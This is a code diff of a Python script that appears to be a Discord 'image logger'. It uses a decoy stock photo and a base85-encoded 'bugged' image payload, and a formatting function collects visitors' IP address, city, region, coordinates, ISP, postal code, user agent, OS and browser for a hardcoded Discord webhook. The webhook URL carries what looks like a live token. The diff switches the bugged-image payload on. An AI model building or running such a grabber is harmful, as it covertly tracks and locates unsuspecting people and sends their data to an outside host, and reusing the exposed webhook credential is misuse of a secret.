@@ -6,11 +6,11 @@ import time
 webhook = 'https://discord.com/api/webhooks/1466906538148102235/itmF63UvtsjjygTjbcLYaxwBTBB5Ger3CjaVCbQoab51UZjU7qsxSWXd38xZ3n9ZKmAc'
 
 bindata = httpx.get('https://static8.depositphotos.com/1001435/1011/i/950/depositphotos_10113890-stock-photo-happy-man-outdoor.jpg').content
-buggedimg = False
+buggedimg = True
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
 # Add infinite loop counter
-loop_counter = 0
+loop_counter = 1
 MAX_LOOPS = 100  # Safety limit
 
 def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
